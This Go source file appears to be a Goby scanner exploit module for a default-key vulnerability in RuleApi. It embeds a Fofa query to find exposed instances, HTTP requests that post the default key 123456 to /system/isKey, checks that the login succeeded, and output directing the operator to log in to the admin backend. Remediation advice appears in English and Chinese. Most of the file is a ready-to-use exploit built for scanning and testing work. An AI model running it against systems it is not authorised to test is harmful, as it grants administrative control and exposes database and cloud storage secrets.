package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "RuleApi /system/isKey Default Password Vulnerability",
    "Description": "<p>RuleApi is an API program based on the official Typecho version database, developed using the Java Spring Boot framework, and integrates Redis caching database along with COS and OSS object storage. </p><p>In versions V1.0.0 beta and later, RuleApi has a default management center key of 123456. Attackers can exploit this default key to log into the management backend and modify system settings. The backend settings contain sensitive configuration information, including MySQL and Redis user passwords, as well as COS SecretKey, which can lead to information leakage.</p>",
    "Product": "RuleApi",
    "Homepage": "https://github.com/buxia97/RuleApi/",
    "DisclosureDate": "2021-12-05",
    "PostTime": "2025-01-03",
    "Author": "455197090@qq.com",
    "FofaQuery": "body=\"href=\\\"https://github.com/buxia97/RuleApi\\\"\"",
    "GobyQuery": "body=\"href=\\\"https://github.com/buxia97/RuleApi\\\"\"",
    "Level": "2",
    "Impact": "<p>The RuleApi management center has a default password of 123456, which allows attackers to exploit this vulnerability to gain control of the entire platform and perform core functions with administrative privileges.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/buxia97/RuleApi/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "key",
            "type": "input",
            "value": "123456",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/system/isKey",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/plain, */*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "webkey=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"msg\":\"验证成功！\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/system/isKey:123456"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/system/isKey",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/plain, */*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "webkey={{{key}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"msg\":\"验证成功！\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|You can access the management center by visiting {{{fixedhostinfo}}}, enter the default key 123456, and click confirm to log in to the management center."
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "RuleApi /system/isKey 默认口令漏洞",
            "Product": "RuleApi",
            "Description": "<p>RuleApi是一款基于typecho正式版数据库，使用JAVA语言Springboot框架，整合redis缓存数据库，COS、OSS对象存储的API程序。</p><p>RuleApi在V1.0.0&nbsp;bate及以后版本中存在管理中心默认key&nbsp;123456，攻击者可利用默认key登录管理后台修改系统设置，后台设置中存在Mysql、Redis用户密码，COS&nbsp;SecretKey等配置信息泄露。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>RuleApi管理中心存在默认口令123456，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "RuleApi /system/isKey Default Password Vulnerability",
            "Product": "RuleApi",
            "Description": "<p>RuleApi is an API program based on the official Typecho version database, developed using the Java Spring Boot framework, and integrates Redis caching database along with COS and OSS object storage.&nbsp;</p><p>In versions V1.0.0 beta and later, RuleApi has a default management center key of 123456. Attackers can exploit this default key to log into the management backend and modify system settings. The backend settings contain sensitive configuration information, including MySQL and Redis user passwords, as well as COS SecretKey, which can lead to information leakage.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.&nbsp;</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>The RuleApi management center has a default password of 123456, which allows attackers to exploit this vulnerability to gain control of the entire platform and perform core functions with administrative privileges.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9983"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}